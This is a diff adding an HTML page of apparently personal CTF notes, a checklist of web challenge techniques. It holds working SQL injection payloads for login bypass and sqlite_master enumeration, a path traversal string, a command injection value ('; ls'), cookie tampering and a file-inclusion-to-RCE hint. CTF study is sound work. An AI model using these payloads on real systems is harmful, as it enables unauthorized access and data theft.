@@ -1,0 +1,45 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>CTF Template Attack</title>
+</head><body><span style="font-size: 14pt">Inspect throughly (CSS, Javascript)<br/>
+robots.txt<br/>
+cookie<br/>
+local storage<br/>
+sources (hidden directories) (chrome)<br/>
+<br/>
+Inspect through Burp Suite intercepts<br/>
+Modify request headers<br/>
+document.cookie: isAdmin = 1<br/>
+Basecode64<br/>
+flag scattered in the javascript code<br/>
+<br/>
+Match the Regular expression (in JS)<br/>
+picoCTF<br/>
+<br/>
+File inclusion -&gt; RCE (via PHP)<br/>
+rce.php.png<br/>
+<br/>
+XML injection (Burpsuite)<br/>
+<br/>
+SQL Injection<br/>
+-- Bypass login<br/>
+'admin'--&#09;'<br/>
+'' OR 1=1--'<br/>
+<br/>
+'Search'<br/>
+-- Show dummy data<br/>
+'' UNION SELECT 1,2,3--'<br/>
+-- Show created tables<br/>
+'' UNION SELECT 1,2,name FROM sqlite_master WHERE type='table'--'<br/>
+-- Show stored query for the table (find out columns)<br/>
+'' UNION SELECT 1,2,sql FROM sqlite_master WHERE name ='tabmore_le'--'<br/>
+<br/>
+Forbidden paths<br/>
+../../../../flag.txt<br/>
+<br/>
+Command Injection<br/>
+test message; ls<br/>
+<br/>
+</span></body></html>
